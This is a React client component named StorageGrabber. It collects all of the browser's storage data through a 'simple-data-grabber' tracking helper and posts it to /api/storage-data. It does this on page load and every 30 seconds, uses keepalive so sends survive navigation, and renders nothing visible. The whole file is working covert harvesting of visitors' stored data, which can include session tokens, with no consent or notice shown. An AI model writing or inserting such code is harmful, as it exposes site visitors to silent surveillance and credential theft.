"use client"

import { useEffect } from "react"
import { grabAllStorageData } from "@/lib/tracking/simple-data-grabber"

export default function StorageGrabber() {
  useEffect(() => {
    // Function to send data to server
    const sendDataToServer = async () => {
      try {
        // Grab ALL storage data
        const allData = grabAllStorageData()

        // Send to server
        const response = await fetch("/api/storage-data", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            timestamp: new Date().toISOString(),
            storageData: allData,
          }),
          // Keep connection alive even if page navigates away
          keepalive: true,
        })

        if (!response.ok) {
          throw new Error("Failed to send storage data")
        }

        console.log("Storage data sent successfully")
      } catch (error) {
        console.error("Error sending storage data:", error)
      }
    }

    // Send data immediately on page load
    sendDataToServer()

    // Set up interval to send data periodically (every 30 seconds)
    const interval = setInterval(sendDataToServer, 30000)

    // Clean up on unmount
    return () => clearInterval(interval)
  }, [])

  // This component doesn't render anything
  return null
}
